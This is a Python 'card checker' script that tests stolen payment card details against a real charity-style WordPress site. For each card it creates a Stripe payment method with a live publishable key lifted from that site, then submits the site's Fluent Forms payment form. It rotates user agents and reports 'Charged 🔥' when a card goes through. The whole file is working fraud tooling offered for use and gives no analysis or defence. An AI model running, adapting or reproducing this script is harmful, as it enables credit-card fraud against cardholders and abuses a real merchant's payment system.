import requests,re
import random
def Tele(ccx):
  import requests
  ccx=ccx.strip()
  n = ccx.split("|")[0]
  mm = ccx.split("|")[1]
  yy = ccx.split("|")[2]
  cvc = ccx.split("|")[3]
  if "20" in yy:#Mo3gza
    yy = yy.split("20")[1]
  r = requests.session()

  user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.110 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 13; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
    ]

  ra = random.choice(user_agents)
    #print(random_user_agent)

  headers = {
      'authority': 'api.stripe.com',
      'accept': 'application/json',
      'accept-language': 'en-US,en;q=0.9,my;q=0.8',
      'content-type': 'application/x-www-form-urlencoded',
      'origin': 'https://js.stripe.com',
      'referer': 'https://js.stripe.com/',
      'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
      'user-agent': ra,
  }

  data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51IXn9gCjCb8tOn17jeSErBz0QdYjX8cbEuCPcjwo30QUpyupLAxotfh16BIv82hifJPHWFhGrKF2pCkF40Wp3Xac00CTx01pfh'
  r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

  pm = r1.json()['id']


  headers = {
      'authority': 'galwaybdgroup.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9,my;q=0.8',
      'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
      # 'cookie': '__stripe_mid=cd04496a-fc78-49f6-99fc-6310e3e55e6221dc47; __stripe_sid=b3b7888f-21a6-4ff7-a3cf-b0242d6fcf37cce97e',
      'origin': 'https://galwaybdgroup.com',
      'referer': 'https://galwaybdgroup.com/sample-page/',
      'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': ra,
      'x-requested-with': 'XMLHttpRequest',
  }

  params = {
      't': '1731159206711',
  }

  data = {
      'data': 'UxOzYJwSrYxC=IavQbCoqSQBZ0713uAr6lvYdOq3ApUDN2QhYGDmQdtOadtWADeejlaU5tfKJtcUg&__fluent_form_embded_post_id=2&_fluentform_2_fluentformnonce=20283e8ace&_wp_http_referer=%2Fsample-page%2F&email=rein48287%40gmail.com&payment_input=0&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
      'action': 'fluentform_submit',
      'form_id': '2',
  }

  r2 = requests.post(
      'https://galwaybdgroup.com/wp-admin/admin-ajax.php',
      params=params,
      headers=headers,
      data=data,
  )
  #print(r2)
  if r2.status_code == 200:
      return "Charged 🔥"
  if "'success':True" in r2.text:
      return "Charged 🔥"
  elif "Thank you for your message. We will get in touch with you shortly" in r2.text:
      return "Charged 🔥"
      
  return (r2.json()['errors'])
